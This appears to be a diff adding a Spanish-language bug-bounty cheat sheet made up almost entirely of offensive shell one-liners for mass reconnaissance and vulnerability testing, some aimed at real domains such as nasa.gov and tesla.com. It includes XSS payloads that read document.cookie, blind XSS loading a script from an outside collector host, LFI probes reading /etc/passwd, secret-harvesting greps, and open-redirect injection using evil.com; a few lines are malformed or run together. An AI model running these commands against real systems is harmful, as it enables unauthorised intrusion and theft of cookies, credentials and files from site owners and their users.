@@ -1,0 +1,416 @@
+app.alert("XSS en PDF Funcional");
+Dorking
+sitio:*.google.com ext:php
+site:*.host.com ext:asp
+
+site:*.host.com ext:jsp
+
+site:*.host.com ext:aspx
+
+site:*.host.com ext:jspx
+
+site:*.host.com ext:do
+
+site:*.host.com ext:action
+
+site:*.host.com ext:php
+
+Wayback Machine
+http://web.archive.org/cdx/search/cdx?url=google.com%2Fapi%2F*&output=text&fl=original&collapse=urlkey&from=
+
+subfinder -d dominios.txt -all -recursive -o subfinder.txt
+
+luego de usar subfinder
+cat Subs01.txt | httpx -o AlliveSubs_XXXX.txt
+
+Wayback Machine URL Extraction
+
+cat AlliveSubs_XXXX.txt | waybackurls | tee urls_globe.txt
+
+Parameter Extraction
+
+cat urls_XXXX.txt | grep '=' | tee param_urls.txt
+
+XSS Vulnerability Testing
+
+cat param_sub_nasa.txt | grep '=' | qsreplace '"><script>alert(document.cookie)</script>' | while read -r url; do 
+curl -s "$url" | grep -q "alert" && echo "[XSS Found] $url"; done
+
+
+
+cat param_sub_nasa.txt | grep '=' | qsreplace '"><script>alert(document.cookie)</script>' | while read -r url; do curl -s "$url" | grep -q "alert" && echo "[XSS Found] $url"; done | tee xss_results.txt
+
+bug bounting xss filtre
+cat Subs01.txt | gau | gf XSS | uro| Gxss | kxss | tee xss_output.txt
+cat Subs01.txt | gau | gf XSS | uro| Gxss | kxss | tee xss_output.txt
+
+
+echo "https://mcl-labcas.jpl.nasa.gov/labcas-ui/s/index.html?search=*" | gau | gf xss | uro| Gxss | kxss | tee xss_output1.txt
+
+echo "https://www.nasa.gov/" | gau
+
+cat xss.txt | grep -OP URL: \K\S+' | sed 's/=.*/=/' | sort u > final.txt
+
+
+
+
+Bug bounting 
+
+
+
+
+enumeración 
+subfinder -d example.com -all -recursive -o subfinder.txt
+assetfinder --subs-only example.com > assetfinder.txt
+findomain -t target.com | tee findomain.txt
+amass enum -passive -d nasa.gov | cut -d']' -f 2 | awk '{print $1}' | sort -u > amass.txt 
+amass enum -active -d example.com | cut -d']' -f 2 | awk '{print $1}' | sort -u > amass.txt
+
+
+
+Fuentes públicas
+
+curl -s https://crt.sh\?q\=\domain.com\&output\=json | jq -r '.[].name_value' | grep -Po '(\w+\.\w+\.\w+)$' >crtsh.txt
+curl -s "http://web.archive.org/cdx/search/cdx?url=*.hackerone.com/*&output=text&fl=original&collapse=urlkey" |sort| sed -e 's_https*://__' -e "s/\/.*//" -e 's/:.*//' -e 's/^www\.//' | sort -u > wayback.txt
+curl -s "https://www.virustotal.com/vtapi/v2/domain/report?apikey=[api-key]&domain=www.nasa.gov" | jq -r '.domain_siblings[]' | >virustotal.txt
+
+Raspado de subdominios de GitHub
+github-subdomains -d domain.com -t [github_token]
+
+
+Buscador de subdominios con tecnología Shodan
+
+# Dominio único
+ shosubgo -d target.com -s YourAPIKEY 
+
+# Múltiples dominios desde el archivo
+ shosubgo -f domains.txt -s YourAPIKEY
+
+union y eliminación de duplicados
+cat *.txt | sort -u > final.txt
+
+Permutación de subdominios y resolución de DNS
+
+subfinder -d domain.com | alterx | dnsx
+echo doamin.com | alterx -enrich | dnsx 
+echo doamin.com | alterx -pp word=/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt | dnsx
+
+Subdominios de fuerza bruta mediante FFUF
+
+ffuf -u "https://FUZZ.target.com" -w wordlist.txt -mc 200,301,302
+
+Descubra hosts mediante direcciones IP y mapeo de ASN
+
+Descubrimiento de ASN e IP
+asnmap -d domain.com | dnsx -silent -resp-only
+
+Descubriendo activos con Amass
+
+amass intel -org "nasa"
+amass intel -active -cidr 159.69.129.82/32
+amass intel -active -asn [asnno]
+
+Recopilación de direcciones IP vinculadas a dominios
+
+curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=<DOMAIN>&apikey=[api-key]" | jq -r '.. | .ip_address? // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
+curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/<DOMAIN>/url_list?limit=500&page=1" | jq -r '.url_list[]?.result?.urlworker?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
+curl -s "https://urlscan.io/api/v1/search/?q=domain:<DOMAIN>&size=10000" | jq -r '.results[]?.page?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
+cat domains.txt | cut -d']' -f2 | awk '{print $2}' | tr ',' '\n' | sort -u > amass.txt
+grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"
+shodan search Ssl.cert.subject.CN:"<DOMAIN>" 200 --fields ip_str | httpx-toolkit -sc -title -server -td
+
+Descubra los anfitriones en vivo
+cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
+
+Reconocimiento visual con Aquatone
+
+cat hosts.txt | aquatone
+cat hosts.txt | aquatone -ports 80,443,8000,8080,8443
+cat hosts.txt | aquatone -ports 80,81,443,591,2082,2087,2095,2096,3000,8000,8001,8008,8080,8083,8443,8834,8888
+
+
+Recopilación y análisis de URL
+Rastreo activo
+
+katana -u livesubdomains.txt -d 2 -o urls.txt
+cat urls.txt | hakrawler -u > urls3.txt
+
+
+Gateo pasivo
+
+cat livesubdomains.txt | gau | sort -u > urls2.txt
+urlfinder -d tesla.com | sort -u >urls3.txt
+echo example.com | gau --mc 200 | urldedupe >urls.txtcat urls.txt | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep '=' | sort > output.txtcat output.txt | sed 's/=.*/=/' >final.txt
+
+
+
+Extracción de parámetros
+
+cat allurls.txt | grep '=' | urldedupe | tee output.txt
+or:
+cat allurls.txt | grep -E '\?[^=]+=.+$' | tee output.txt
+
+
+
+
+Extracción de parámetros
+el siguiente paso es extraer solo aquellas URL que contienen parámetros. objetivos ideales para probar vulnerabilidades como XSS, SQLi, Open Redirect y para ejecutar plantillas Nuclei DAST .
+
+cat allurls.txt | grep '=' | urldedupe | tee output.txt
+or:
+cat allurls.txt | grep -E '\?[^=]+=.+$' | tee output.txt
+
+
+
+Descubrimiento de parámetros mediante patrones gf
+gf (Gf-Patterns) es una poderosa herramienta que le ayuda a filtrar URL según patrones comúnmente asociados con vulnerabilidades como XSS, SQLi, LFI, SSRF, Open Redirect y más.
+
+cat allurls.txt | gf sqli
+
+
+
+descubrimiento de vulnerabilidades
+
+nuclei -u https://target.com -bs 50 -c 30
+nuclei -l live_domains.txt -bs 50 -c 30
+
+
+Descubrimiento de archivos confidenciales
+A partir de las URL recopiladas, podemos identificar archivos potencialmente sensibles (por ejemplo, copias de seguridad, archivos de configuración, registros) que pueden generar vulnerabilidades de divulgación de información, una categoría de error común pero de gran impacto que vale la pena informar.
+
+
+cat allurls.txt | grep -E "\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5"
+cat allurls.txt | grep -E "\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"
+site:*.example.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)
+
+
+
+
+Descubrimiento de parámetros ocultos
+
+
+Passive parameter discovery:
+arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"
+
+
+Active parameter discovery with wordlist:
+arjun -u https://site.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers "User-Agent: Mozilla/5.0"
+
+
+
+Fuerza bruta de directorios y archivos
+Revele directorios y archivos ocultos mediante la fuerza bruta de rutas y extensiones comunes, una técnica crucial para descubrir paneles de administración, copias de seguridad, archivos de desarrollo o puntos finales mal configurados que no están vinculados públicamente pero aún son accesibles.
+
+Uso de Dirsearch
+
+dirsearch -u https://example.com  --full-url --deep-recursive -r
+dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1
+
+Using FFUF
+
+
+ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-Host: localhost" -t 100 -r -o results.json
+
+ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://ens.domains/FUZZ  -fc 401,403,404  -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf -ac -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -r -t 60 --rate 100 -c
+
+
+
+Descubrimiento y análisis de archivos JavaScript
+Los archivos JavaScript suelen contener información valiosa, como puntos finales de API ocultos, funciones internas, nombres de parámetros, credenciales codificadas, tokens, incluso claves confidenciales, comentarios de desarrollo e información de depuración. Analizar estos archivos permite comprender en profundidad la lógica de la aplicación y descubrir vulnerabilidades de ataque ocultas en el frontend.
+
+Búsqueda de archivos JS:
+
+echo example.com | katana -d 3 | grep -E "\.js$" | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ -c 30
+cat jsfiles.txt | grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret" 
+cat allurls.txt | grep -E "\.js$" | httpx-toolkit -mc 200 -content-type | grep -E "application/javascript|text/javascript" | cut -d' ' -f1 | xargs -I% curl -s % | grep -E "(API_KEY|api_key|apikey|secret|token|password)"
+
+
+Análisis masivo de JS:
+echo domain.com | katana -ps -d 2 | grep -E "\.js$" | nuclei -t /nuclei-templates/http/exposures/ -c 30
+cat alljs.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/
+
+
+Filtrado por tipo de contenido
+Filtra el contenido según los tipos MIME para identificar páginas JS o HTML y analizarlas más a fondo. Esto te ayuda a centrarte en los archivos que probablemente contengan puntos finales, parámetros o lógica del cliente valiosos que merecen un análisis más profundo.
+
+Filtrado de contenido HTML
+echo domain | gau | grep -Eo '(\/[^\/]+)\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'
+
+
+Filtrado de contenido JavaScript
+
+echo domain | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
+
+
+Pruebas de seguridad de WordPress
+Si el sitio de destino utiliza WordPress, enumere usuarios, plugins, temas y detalles de la versión. Esto ayuda a identificar componentes obsoletos, configuraciones incorrectas y posibles vectores de ataque, como plugins vulnerables o paneles de administración expuestos.
+
+wpscan --url https://site.com --disable-tls-checks --api-token <here> -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force
+
+
+
+Reconocimiento a nivel de red
+Analice el objetivo en busca de puertos abiertos, servicios en ejecución y versiones de software. Esto le ayudará a encontrar servicios vulnerables o mal configurados que podrían no ser visibles desde la interfaz web.
+
+Escaneo de puertos con Naabu
+
+naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt
+
+Escaneo completo de Nmap
+
+nmap -p- --min-rate 1000 -T4 -A target.com -oA fullscan
+
+Masscan para velocidad
+
+masscan -p0-65535 target.com --rate 100000 -oG masscan-results.txt
+
+
+
+Descubrimiento de vulnerabilidades
+Tras recopilar todos los dominios y URL, es hora de pasar de la recopilación de información a las pruebas reales. Aquí es donde el reconocimiento se une a la explotación. Ahora, utiliza los datos recopilados para empezar a detectar vulnerabilidades reales con diferentes herramientas y técnicas.
+
+Pruebas de inyección SQL
+La inyección SQL sigue siendo una de las vulnerabilidades web más peligrosas e impactantes. Aquí tienes un enfoque práctico para identificarla y explotarla eficazmente.
+
+
+for possible SQL technology detection:
+subfinder -dL subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
+
+for single domain:
+subfinder -d http://example.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
+
+Este comando filtrará las URL que utilizan tecnologías y patrones que comúnmente son vulnerables a la inyección de SQL, lo que le ayudará a priorizar los objetivos de alto riesgo para las pruebas.
+
+for possible SQL Endpoints:
+echo http://site.com | gau | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep -E '\?[^=]+=.+$'
+
+
+
+
+
+
+
+
+
+
+
+Pruebas de secuencias de comandos entre sitios (XSS)
+XSS es una vulnerabilidad común y peligrosa que permite a los atacantes inyectar scripts maliciosos en páginas web, lo que provoca secuestro de sesiones, redireccionamientos o desfiguración. Empiece con estos breves consejos para una detección rápida y luego pase a técnicas avanzadas como XSS ciego y fuzzing de parámetros para realizar pruebas más exhaustivas.
+
+echo "target.com" | gau | gf xss | uro | httpx -silent | Gxss -p Rxss | dalfox
+echo "example.com" | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln
+echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
+cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > final.txt
+
+Pruebas XSS con el modo de solicitud FFUF
+
+ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr "<script>alert('XSS')</script>"
+
+
+Pruebas XSS a ciegas
+
+
+cat urls.txt | grep -E "(login|signup|register|forgot|password|reset)" | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/xss/ -severity critical,high
+
+
+subfinder -d example.com | gau | bxss -payload '"><script src=https://xss.report/c/coffinxp></script>' -header "X-Forwarded-For"
+subfinder -d example.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters
+cat xss_params.txt | dalfox pipe --blind https://your-collaborator-url --waf-bypass --silence
+
+
+pruebas rápidas de xss
+echo example.com | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
+
+cat prueba.txt | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
+
+
+
+Refinando y validando resultados
+cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > final.txt
+
+
+
+Prueba de inclusión de archivos locales (LFI)
+La Inclusión Local de Archivos (LFI) es una vulnerabilidad que permite a los atacantes incluir y leer archivos del servidor, como /etc/passwd, archivos de registro o archivos de configuración. Puede provocar la exposición de datos confidenciales, la ejecución de código o incluso la vulneración total del sistema. Utilice las siguientes instrucciones para automatizar la detección de LFI y el fuzzing de parámetros vulnerables.
+
+Descubrimiento automatizado de LFI: 
+nuclei -l subs.txt -t /root/nuclei-templates/http/vulnerabilities/generic/generic-linux-lfi.yaml -c 30                                                                                      
+echo "https://example.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
+gau target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+
+ Método LFI alternativo: 
+echo 'https://example.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr "root:(x|\*|\$[^\:]*):0:0:"
+echo "https://example.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
+
+
+Pruebas LFI mediante el modo de solicitud FFUF
+
+
+ffuf -request lfi -request-proto https -w /root/wordlists/offensive\ payloads/LFI\ payload.txt -c -mr "root:"
+
+
+
+Pruebas CORS (Intercambio de recursos entre orígenes)
+Las políticas CORS mal configuradas pueden permitir que dominios no autorizados accedan a datos confidenciales o realicen acciones privilegiadas en distintos orígenes, lo que podría derivar en problemas de seguridad graves, como la apropiación de cuentas o el robo de datos.
+
+Esta sección cubre métodos manuales y automatizados para detectar configuraciones CORS inseguras utilizando comandos curl simples y herramientas potentes como httpx, nuclei, Corsy y CORScanner.
+
+Pruebas CORS manuales con curl
+
+curl -H "Origin: http://example.com" -I https://domain.com/wp-json/
+
+
+
+Análisis CORS detallado
+
+curl -H "Origin: http://example.com" -I https://domain.com/wp-json/ | grep -i -e "access-control-allow-origin" -e "access-control-allow-methods" -e "access-control-allow-credentials"
+
+Pruebas CORS automatizadas:
+
+cat example.coms.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt
+python3 corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
+python3 CORScanner.py -u https://example.com -d -t 10
+
+
+Subdomain Takeover Detection------------
+La toma de control de un subdominio ocurre cuando un subdominio apunta a un servicio externo (como GitHub Pages, Heroku o S3) que ya no está registrado, lo que permite a los atacantes secuestrarlo.
+
+Herramientas como subzy pueden automatizar el proceso de detección al verificar firmas de adquisición en múltiples proveedores, verificar SSL y usar alta concurrencia para obtener resultados más rápidos mientras se filtran falsos positivos.
+
+cat domains.txt | grep "SUCCESS" | gf urls | httpx-toolkit -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe
+
+
+
+
+SSRF Testing & Exploitation
+
+
+La falsificación de solicitudes del lado del servidor (SSRF) es una vulnerabilidad potente que permite a los atacantes hacer que el servidor inicie solicitudes a recursos internos o externos. Esto puede provocar la exposición de datos confidenciales, el acceso a metadatos en la nube, el escaneo de puertos internos o incluso la ejecución remota de código si se encadena correctamente.
+
+Esta sección cubre un flujo de trabajo de prueba SSRF completo, desde la identificación de parámetros vulnerables, el uso de herramientas de automatización, la creación de cargas útiles de derivación y el encadenamiento de SSRF con otras vulnerabilidades para lograr el máximo impacto.
+
+
+cat final.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=|redirect_url=|redirect_to=|forward_to=|forward_url=|destination_url=|jump_to=|go_to=|goto_url=|target_url=|redirect_link=" | tee redirect_params.txt
+
+
+
+final.txt | gf redirect | uro | sort -u | tee redirect_params.txt
+
+
+cat redirect_params.txt | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
+
+
+subfinder -d vulnweb.com -all | httpx-toolkit -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
+
+
+cat redirect_params.txt | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
+
+
+
+
+echo target.com -all | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
+
+
+
+
+subfinder -d target.com -all | httpx-toolkit -silent | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
